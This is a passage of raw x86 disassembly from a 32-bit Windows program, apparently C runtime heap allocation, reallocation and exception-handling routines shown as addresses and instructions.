  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
